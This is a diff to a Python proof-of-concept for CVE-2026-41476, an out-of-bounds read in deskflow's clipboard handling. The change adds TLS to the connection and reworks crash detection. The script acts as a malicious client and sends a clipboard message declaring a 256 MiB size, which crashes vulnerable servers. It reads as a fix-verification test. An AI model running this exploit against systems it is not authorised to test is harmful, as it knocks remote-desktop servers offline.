@@ -11,17 +11,20 @@ layout. We declare 256 MiB instead so the std::string copy ctor's memcpy is
 guaranteed to walk off any plausible mapped region.
 
 This PoC connects as a malicious client, completes the v1.8 handshake, and
-pushes the bad clipboard. Reports VULNERABLE if the server drops the TCP
-connection. Prereq: TLS off on target; --name must match a configured screen.
+pushes the bad clipboard. Reports VULNERABLE if the server drops the
+connection. Prereq: --name must match a configured screen on the target.
 The fixed deskflow rejects the message with a `payload size … exceeds
 remaining …` log line and keeps the connection alive.
 """
 
 import argparse
 import socket
+import ssl
 import struct
 import sys
 import time
+
+from utils import create_ssl_socket
 
 PROTO_MAJOR, PROTO_MINOR = 1, 8
 CHUNK_START, CHUNK_DATA, CHUNK_END = 1, 2, 3
@@ -92,27 +95,27 @@ def send_malicious_clipboard(sock):
 
 
 def is_alive(sock):
-    # Detecting a crashed peer is racy. After a peer crash:
-    #   - FIN: TCP allows writes after peer-FIN (half-close), so sendall
-    #     would succeed and SO_ERROR stays 0. Catch with MSG_PEEK -> b"".
-    #   - RST: in-flight; first send may succeed before RST arrives, so
-    #     check SO_ERROR after a sleep + second send.
+    # MSG_PEEK / SO_ERROR don't compose with TLS the way they do with raw
+    # sockets, so probe by I/O: short-timeout recv first (clean EOF means peer
+    # closed), then a second send after a brief wait — RST often only surfaces
+    # on the second write because the first one buffers locally.
     time.sleep(2.0)
-    sock.setblocking(False)
+    sock.settimeout(0.5)
     try:
-        if sock.recv(1, socket.MSG_PEEK) == b"":
+        if sock.recv(1) == b"":
             return False
-    except BlockingIOError:
+    except (socket.timeout, ssl.SSLWantReadError):
         pass
-    except OSError:
+    except (OSError, ssl.SSLError):
         return False
-    finally:
-        sock.setblocking(True)
+    sock.settimeout(5.0)
     try:
         sock.sendall(frame(b"CNOP"))
-    except OSError:
+        time.sleep(0.5)
+        sock.sendall(frame(b"CNOP"))
+    except (OSError, ssl.SSLError):
         return False
-    return sock.getsockopt(socket.SOL_SOCKET, socket.SO_ERROR) == 0
+    return True
 
 
 def main():
@@ -128,7 +131,7 @@ def main():
     print(f"CVE-2026-41476 — clipboard unmarshall OOB read")
     print(f"target: {args.host}:{args.port}  name: {args.name!r}")
 
-    sock = socket.create_connection((args.host, args.port), timeout=5.0)
+    sock = create_ssl_socket(args.host, args.port, timeout=10.0)
     try:
         handshake(sock, args.name)
         send_malicious_clipboard(sock)
@@ -139,7 +142,7 @@ def main():
     if alive:
         print("[PASS] peer survived — fix is in place")
         return 0
-    print("[FAIL] peer dropped TCP connection — VULNERABLE (CVE-2026-41476)")
+    print("[FAIL] peer dropped connection — VULNERABLE (CVE-2026-41476)")
     return 1
 
 
